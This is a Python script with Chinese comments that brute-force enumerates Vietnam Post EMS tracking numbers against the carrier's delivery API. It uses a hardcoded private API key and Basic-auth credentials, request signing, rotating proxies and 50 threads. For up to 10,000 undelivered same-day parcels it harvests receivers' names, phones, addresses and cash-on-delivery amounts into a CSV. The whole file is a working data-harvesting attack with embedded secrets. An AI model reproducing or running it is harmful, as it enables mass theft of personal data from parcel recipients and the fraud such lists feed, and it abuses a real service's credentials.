#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
全自动探索器 - 自动发现所有系列的密集区
策略：
1. 测试所有EA-EZ系列
2. 每个系列快速探索多个区间
3. 发现密集区后记录
4. 最后集中扫描所有密集区
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {
    'found': 0, 'tested': 0, 'orders': [], 'explored': 0,
    'dense_zones': [],  # 发现的密集区
    'lock': threading.Lock(), 
    'start_time': time.time(),
    'csv_file': None
}
TARGET = 10000

def load_proxies():
    global proxies
    try:
        with open("proxy_list.txt", 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    parts = line.strip().split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
        print(f"✅ {len(proxies)} 个代理\n")
    except:
        print("⚠️  无代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg, flush=True)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def quick_check(tracking):
    """快速检查是否有今天的订单"""
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, 
                         data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            return is_today(issue_date)
    except:
        pass
    
    return False

def check_order(tracking):
    """详细检查并保存订单"""
    if state['found'] >= TARGET:
        return
    
    sig = sign(tracking)
    headers = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers, 
                         data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=5)
        
        with state['lock']:
            state['tested'] += 1
        
        if r.status_code == 200 and r.json().get('Value'):
            v = r.json()['Value']
            issue_date = v.get('IssueDate') or v.get('LoadDate')
            
            if is_today(issue_date):
                r2 = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers, 
                                  data={"ParcelCode": tracking}, proxies=proxy, timeout=5)
                is_delivered = r2.status_code == 200 and r2.json().get('ListValue')
                
                if not is_delivered:
                    order = {
                        'tracking': tracking, 'issue_date': issue_date,
                        'receiver': v.get('ReceiverName',''), 
                        'phone': v.get('ReceiverPhone','') or extract_phone(v.get('ReceiverName','')),
                        'amount': v.get('CollectAmount',0),
                        'address': v.get('ReceiverAddress',''),
                    }
                    
                    with state['lock']:
                        state['found'] += 1
                        state['orders'].append(order)
                        
                        safe_print(f"✅ [{state['found']:,}] {tracking} | 👤{order['receiver'][:15]} | 💰{order['amount']:,}₫")
                        
                        if state['found'] % 50 == 0 or state['found'] == 1:
                            save_progress()
    except:
        pass

def save_progress():
    if not state['csv_file']:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        state['csv_file'] = f"auto_explore_{timestamp}.csv"
        safe_print(f"\n💾 创建: {state['csv_file']}\n")
    
    with open(state['csv_file'], 'w', encoding='utf-8') as f:
        f.write("运单号,发件日期,收件人,电话,地址,金额\n")
        for o in state['orders']:
            f.write(f'"{o["tracking"]}","{o["issue_date"]}","{o["receiver"]}","{o["phone"]}","{o["address"]}","{o["amount"]}"\n')
    
    safe_print(f"💾 已保存 {state['found']:,} 个\n")

def explore_all_series():
    """阶段1：探索所有系列"""
    print(f"🔍 阶段1：探索所有EA-EZ系列的密集区...\n")
    
    # 所有E开头的系列
    series = ['EA', 'EB', 'EC', 'ED', 'EE', 'EF', 'EG', 'EH', 'EI', 'EJ', 'EK', 'EL', 'EM', 'EN', 'EO', 'EP', 'EQ', 'ER', 'ES', 'ET', 'EU']
    
    # 每个系列测试多个可能的区间
    test_points = [
        10000000,   # 1千万
        40000000,   # 4千万
        100000000,  # 1亿
        120000000,  # 1.2亿
        135000000,  # 1.35亿
        150000000,  # 1.5亿
        200000000,  # 2亿
        300000000,  # 3亿
        400000000,  # 4亿
        492000000,  # EP老区间
        493000000,  # EP新区间
        500000000,  # 5亿
        700000000,  # 7亿
        900000000,  # 9亿
    ]
    
    for series_prefix in series:
        safe_print(f"📍 探索 {series_prefix} 系列...")
        
        series_hits = []
        
        for point in test_points:
            # 在这个点附近测试3个号码
            for offset in [0, 5000, 10000]:
                tracking = f"{series_prefix}{point + offset:09d}VN"
                
                with state['lock']:
                    state['explored'] += 1
                
                if quick_check(tracking):
                    series_hits.append(point)
                    safe_print(f"  🎯 {series_prefix}{point:09d} 附近有今天订单！")
                    break
        
        # 记录这个系列的密集区
        for hit in series_hits:
            zone = (series_prefix, hit - 100000, hit + 100000, 50)  # 前后10万，步长50
            state['dense_zones'].append(zone)
            safe_print(f"  ✅ 添加密集区：{series_prefix}{hit-100000:09d}-{hit+100000:09d}")
    
    safe_print(f"\n📊 探索完成！发现 {len(state['dense_zones'])} 个密集区\n")
    return state['dense_zones']

def scan_dense_zones():
    """阶段2：密集扫描所有发现的区域"""
    print(f"🚀 阶段2：密集扫描 {len(state['dense_zones'])} 个区域...\n")
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        for prefix, start, end, step in state['dense_zones']:
            if state['found'] >= TARGET:
                break
            
            safe_print(f"📍 密集扫描 {prefix}{start:09d}-{end:09d}")
            
            futures = []
            for num in range(start, end, step):
                if state['found'] >= TARGET:
                    break
                
                tracking = f"{prefix}{num:09d}VN"
                futures.append(executor.submit(check_order, tracking))
            
            for future in as_completed(futures):
                if state['found'] >= TARGET:
                    break
                try:
                    future.result()
                except:
                    pass

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║      🌍 全自动探索器 - 自动发现所有系列密集区 - {TODAY}    ║
╚════════════════════════════════════════════════════════════════════════════╝

策略：
  1️⃣ 探索21个系列（EA-EU）
  2️⃣ 每系列测试14个可能区间
  3️⃣ 发现有订单的区间
  4️⃣ 密集扫描所有发现区域

优势：
  ✅ 自动发现所有系列
  ✅ 不遗漏任何密集区
  ✅ 每天自动适应
  ✅ 最大化覆盖率

目标：{TARGET:,} 个今天未签收订单
""")

load_proxies()

# 两阶段
zones = explore_all_series()

if zones:
    scan_dense_zones()
else:
    print("❌ 未发现密集区")

save_progress()

elapsed = time.time() - state['start_time']
print(f"""
\n{'='*80}
🎉 完成！
{'='*80}
探索：{state['explored']} 个测试点
扫描：{state['tested']:,} 个运单号
找到：{state['found']:,} 个今天订单
密集区：{len(state['dense_zones'])} 个
耗时：{elapsed/60:.1f} 分钟
文件：{state['csv_file']}
{'='*80}
""")
